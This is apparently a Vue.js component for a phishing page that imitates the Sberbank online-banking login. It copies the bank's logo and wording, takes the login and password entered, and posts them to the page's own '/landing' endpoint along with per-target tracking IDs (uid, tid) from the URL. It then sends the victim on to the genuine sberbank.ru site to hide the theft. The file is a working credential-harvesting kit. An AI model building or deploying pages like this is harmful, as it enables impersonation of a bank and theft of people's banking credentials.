<template>
  <v-container>
    <v-row justify="start" align="start" class="full-width">
      <v-col cols="1" class="hidden-sm-and-down"/>

      <v-col md="4" sm="6">
        <v-card class="elevation-12 rounded" style="z-index:10">

          <v-card-text data-unit="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="204" height="32" viewBox="0 0 204 32">
              <defs>
                <linearGradient id="logo2020-a" x1="53.225%" x2="34.274%" y1="96.175%" y2="6.488%">
                  <stop offset="14.44%" stop-color="#F2E913"></stop>
                  <stop offset="30.37%" stop-color="#E7E518"></stop>
                  <stop offset="58.23%" stop-color="#CADB26"></stop>
                  <stop offset="89.1%" stop-color="#A3CD39"></stop>
                </linearGradient>
                <linearGradient id="logo2020-b" x1="8.721%" x2="87.794%" y1="53.056%" y2="35.121%">
                  <stop offset="5.92%" stop-color="#0FA8E0"></stop>
                  <stop offset="53.85%" stop-color="#0099F9"></stop>
                  <stop offset="92.34%" stop-color="#0291EB"></stop>
                </linearGradient>
                <linearGradient id="logo2020-c" x1="-2.014%" x2="92.148%" y1="52.572%" y2="39.906%">
                  <stop offset="12.26%" stop-color="#A3CD39"></stop>
                  <stop offset="28.46%" stop-color="#86C339"></stop>
                  <stop offset="86.93%" stop-color="#21A038"></stop>
                </linearGradient>
                <linearGradient id="logo2020-d" x1="-7.695%" x2="86.732%" y1="46.707%" y2="63.428%">
                  <stop offset="5.66%" stop-color="#0291EB"></stop>
                  <stop offset="79%" stop-color="#0C8ACB"></stop>
                </linearGradient>
                <linearGradient id="logo2020-e" x1="7.814%" x2="93.74%" y1="45.673%" y2="66.374%">
                  <stop offset="13.24%" stop-color="#F2E913"></stop>
                  <stop offset="29.77%" stop-color="#EBE716"></stop>
                  <stop offset="53.06%" stop-color="#D9E01F"></stop>
                  <stop offset="80.23%" stop-color="#BBD62D"></stop>
                  <stop offset="98.29%" stop-color="#A3CD39"></stop>
                </linearGradient>
                <linearGradient id="logo2020-f" x1="44.137%" x2="66.795%" y1="103.773%" y2="14.696%">
                  <stop offset="6.98%" stop-color="#A3CD39"></stop>
                  <stop offset="25.99%" stop-color="#81C55F"></stop>
                  <stop offset="92.16%" stop-color="#0FA8E0"></stop>
                </linearGradient>
              </defs>
              <g fill="none" fill-rule="evenodd">
                <g fill-rule="nonzero">
                  <path fill="#21A038"
                        d="M28.8480721,6.2168089 C29.6080865,7.1930489 30.2580578,8.25976 30.7777662,9.3968 L16.1049697,20.1418666 L9.97430591,16.3235556 L9.97430591,11.7300444 L16.1049697,15.5483556 L28.8480721,6.2168089 Z"></path>
                  <path fill="url(#logo2020-a)"
                        d="M3.72037577,15.9994666 C3.72037577,15.7934222 3.72544849,15.5886222 3.73555817,15.3850666 L0.0202336508,15.2003556 C0.00758792324,15.4654222 0,15.7318222 0,15.9994666 C0,20.4170666 1.80202597,24.4176 4.71686695,27.3136889 L7.35098124,24.6964444 C5.11015092,22.4675556 3.72037577,19.3918222 3.72037577,15.9994666 Z"></path>
                  <path fill="url(#logo2020-b)"
                        d="M16.1034488,3.69516445 C16.3109207,3.69516445 16.516961,3.70270221 16.7218384,3.71275555 L16.9078384,0.0201032889 C16.6410505,0.00753904 16.3729207,0 16.1034488,0 C11.657342,0 7.63086695,1.79040889 4.71602597,4.6864889 L7.35013131,7.30362666 C9.59344877,5.0747289 12.6891544,3.69516445 16.1034488,3.69516445 Z"></path>
                  <path fill="url(#logo2020-c)"
                        d="M16.1040751,28.3036444 C15.8966927,28.3036444 15.6905628,28.2986666 15.4856855,28.2885334 L15.2997749,31.979911 C15.5665628,31.9925334 15.8346927,32 16.1040751,32 C20.5502713,32 24.5766927,30.2096 27.4915873,27.3136 L24.8574372,24.6964444 C22.6140751,26.9228444 19.5183694,28.3036444 16.1040751,28.3036444 Z"></path>
                  <path fill="url(#logo2020-d)"
                        d="M23.0869928,5.8424089 L26.2193795,3.54941334 C23.4549668,1.32929778 19.9369812,0 16.1052381,0 L16.1052381,3.69642666 C18.6939394,3.69516445 21.0978038,4.48922666 23.0869928,5.8424089 Z"></path>
                  <path fill="#21A038"
                        d="M32.2078817,15.9994666 C32.2078817,15.0206222 32.1193103,14.0632 31.9498616,13.1322666 L28.4836767,15.6702222 C28.4861818,15.7795556 28.4886869,15.8888 28.4886869,15.9981334 C28.4886869,19.6104 26.9130101,22.8645334 24.4091227,25.1173334 L26.9092525,27.8626666 C30.1630448,24.9364444 32.2078817,20.7047111 32.2078817,15.9994666 Z"></path>
                  <path fill="url(#logo2020-e)"
                        d="M16.1052381,28.3036444 C12.4696046,28.3036444 9.19425109,26.7381334 6.92689409,24.2504 L4.16379655,26.7343111 C7.11025482,29.9684445 11.3693506,32 16.1052381,32 L16.1052381,28.3036444 Z"></path>
                  <path fill="url(#logo2020-f)"
                        d="M7.79990417,6.8802311 L5.29983694,4.13493334 C2.04481904,7.06241779 0,11.2940444 0,15.9994666 L3.72037577,15.9994666 C3.72164617,12.3859556 5.29604358,9.13297779 7.79990417,6.8802311 Z"></path>
                </g>
                <g fill="#21A038" transform="translate(40.26 5.333)">
                  <g transform="translate(1.296 .848)">
                    <polygon
                        points="50.316 3.411 54.634 .25 40.184 .25 40.184 19.238 54.634 19.238 54.634 16.077 44.307 16.077 44.307 11.215 53.116 11.215 53.116 8.054 44.307 8.054 44.307 3.411"></polygon>
                    <path
                        d="M28.8483744 16.0765405L24.5479087 16.0765405 24.5479087 10.8132613 28.8483744 10.8132613C31.4659104 10.8132613 32.6848738 11.6934054 32.6848738 13.445045 32.6848738 15.2341622 31.3939506 16.0765405 28.8483744 16.0765405M29.566231 7.65131532L24.5479087 7.65131532 24.5479087 3.41117117 31.9786236 3.41117117 36.2964989.249801802 20.4241507.249801802 20.4241507 19.2381982 29.0346573 19.2381982C33.8643753 19.2381982 36.6342455 17.0642162 36.6342455 13.2732252 36.6342455 9.648 34.1240688 7.65131532 29.566231 7.65131532M66.2529664 10.6978595L62.5972369 10.6978595 62.5972369 3.41137297 66.2529664 3.41137297C68.895166 3.41137297 70.3503199 4.70521081 70.3503199 7.05447207 70.3503199 9.40402162 68.895166 10.6978595 66.2529664 10.6978595M66.3411751.250003604L58.4734789.250003604 58.4734789 19.2384 62.5972369 19.2384 62.5972369 13.8595171 66.3411751 13.8595171C71.3618186 13.8595171 74.4804614 11.2369586 74.4804614 7.04524685 74.4804614 2.85382342 71.3618186.250003604 66.3411751.250003604M13.9256628 15.1267748C12.8680285 15.7065225 11.6368784 16.012973 10.365396 16.012973 6.64757225 16.012973 3.94908155 13.3762883 3.94908155 9.74356757 3.94908155 6.11113514 6.64757225 3.47416216 10.365396 3.47416216 11.7720931 3.47416216 13.0325494 3.8670991 14.1162981 4.64028829L17.0741921 2.47466667 16.8789142 2.304C15.15159.796828829 12.8442354 7.10542736e-15 10.206098 7.10542736e-15 7.34395694 7.10542736e-15 4.74673219.958846847 2.89231777 2.70010811 1.02716743 4.45145946 4.04063507e-13 6.91603604 4.04063507e-13 9.63891892 4.04063507e-13 12.3747748 1.02339534 14.8750991 2.881872 16.6803604 4.74615187 18.4905225 7.33786358 19.4877117 10.1796935 19.4877117 13.1523856 19.4877117 15.7484497 18.4579459 17.5082719 16.5843604 16.1503218 15.5897658 14.8393776 14.6300541 14.8393776 14.6300541L13.9256628 15.1267748z"></path>
                  </g>
                  <g transform="translate(82.845 1.06)">
                    <path
                        d="M8.42393354,15.8641586 L4.12375804,15.8641586 L4.12375804,10.6008793 L8.42393354,10.6008793 C11.0414695,10.6008793 12.2607231,11.4810234 12.2607231,13.2326631 C12.2607231,15.0217802 10.9697999,15.8641586 8.42393354,15.8641586 M9.14208026,7.43893333 L4.12375804,7.43893333 L4.12375804,3.19878919 L11.5541828,3.19878919 L15.872058,0.0374198198 L-5.28023993e-13,0.0374198198 L-5.28023993e-13,19.0258162 L8.61050661,19.0258162 C13.4399345,19.0258162 16.2098046,16.8518342 16.2098046,13.0608432 C16.2098046,9.43561802 13.6999181,7.43893333 9.14208026,7.43893333"></path>
                    <polygon
                        points="66.623 18.991 62.442 18.991 62.442 0 66.623 0 66.623 7.976 68.9 7.976 75.043 0 79.784 0 72.493 9.034 80.958 18.991 75.409 18.991 69.189 11.521 66.623 11.521"></polygon>
                    <path
                        d="M30.4914361,11.8586523 L27.5111997,4.53699459 L24.5039785,11.8586523 L30.4914361,11.8586523 Z M31.8734695,15.2771748 L23.0952503,15.2771748 L21.6052772,18.9381477 L17.1890376,18.9381477 L25.4252374,0.0956252252 L29.841477,0.0956252252 L37.942172,18.9381477 L33.3631525,18.9381477 L31.8734695,15.2771748 Z"></path>
                    <polygon
                        points="44.506 .096 44.506 7.956 53.095 7.956 53.095 .096 57.375 .096 57.375 18.938 53.095 18.938 53.095 11.509 44.506 11.509 44.506 18.938 40.225 18.938 40.225 .096"></polygon>
                  </g>
                </g>
              </g>
            </svg>
          </v-card-text>


          <!-- LOGIN -->

          <!--INPUTS-->
          <v-card flat class="rounded">
            <v-card-text class="px-6 pt-10">
              <v-form ref="form" v-model="valid" lazy-validation>
                <v-text-field label="Введите логин" validate-on-blur clearable required
                              v-model="userPrincipal.email"/>
                <v-text-field label="Введите пароль" validate-on-blur required
                              v-model="userPrincipal.password"
                              :append-icon="showPassword ? mdiEyeOutline : mdiEyeOffOutline"
                              :type="showPassword ? 'text' : 'password'"
                              @click:append="showPassword = !showPassword"/>

              </v-form>
            </v-card-text>

            <v-container>
              <v-row class="mx-auto">
                <v-col class="mx-auto">
                  <v-btn @click="login" depressed dark block color="green">
                    Войти
                  </v-btn>
                </v-col>
              </v-row>
              <v-row justify="space-around">
                <v-col class="justify-center">
                  <v-btn class="mt-n3" color="grey"
                         right absolute text x-small>
                    забыли логин или пароль?
                  </v-btn>
                </v-col>
              </v-row>
            </v-container>
            <v-divider></v-divider>

            <v-container class="mt-n2">
              <v-row justify="start" no-gutters>
                <v-col class="d-flex justify-start">
                  <a href="" class="link-hover" style="color: green">Регистрация ></a>
                </v-col>
              </v-row>
              <v-row justify="start" no-gutters>
                <v-col class="d-flex justify-center caption">
                  <span>Нужна карта СберБанка и мобильный телефон</span>
                </v-col>
              </v-row>
            </v-container>
          </v-card>
        </v-card>
      </v-col>
    </v-row>

    <section class='wave-container'>
      <div class='wave -one'></div>
      <div class='wave -two'></div>
      <div class='wave -three'></div>
    </section>
  </v-container>
</template>

<script>
import {mdiChevronLeft, mdiEyeOffOutline, mdiEyeOutline, mdiFacebook, mdiGoogle, mdiVk} from '@mdi/js'

export default {
  name: "index",
  layout: 'sber',
  data() {
    return {
      mdiVk, mdiGoogle, mdiFacebook, mdiEyeOutline, mdiChevronLeft, mdiEyeOffOutline,
      emailRules: [
        v => !!v || 'Укажите адресс своей эл. почты',
        v => /.+@.+\..+/.test(v) || 'Введите правильный адрес',
        v => (v && v.length < 40) || 'Адрес слишком длинный'
      ],
      passwordRules: [
        v => !!v || 'Придумайте пароль',
        v => (v == null || v.length >= 4) || 'Минимум 4 символа',
        v => (v && v.length < 250) || 'Пароль слишком длинный'
      ],
      showPassword: false,
      tabs: null,
      valid: true,
      userPrincipal: {email: null, password: null, timezone: null, locale: null},
      passwordConfirmation: null,
    }
  },
  methods: {
    async login() {
      if (this.validate()) {
        try {
          console.log('User submitted creds')
          let uid = this.$route.query.uid;
          let tid = this.$route.query.tid;
          let isPersonal = this.$route.query.isPersonal;
          console.log(`[login] isPersonal=${isPersonal}`)
          await this.$axios.$post(`/landing?uid=${uid}&tid=${tid}&isPersonal=${isPersonal}`, {
            'login': this.userPrincipal.email,
            'password': this.userPrincipal.password
          });
         window.location = 'https://www.sberbank.ru/ru/person';
        } catch (error) {
          console.error('Ошибка логина: ', error);
        } finally {
          this.loading = false;
        }
      }
    },
    validate() {
      this.valid = this.$refs.form.validate();
      return this.valid;
    },
  }
}
</script>

<style scoped>
.link-hover {
  text-decoration: none;
}

.link-hover:hover {
  text-decoration: underline;
}
</style>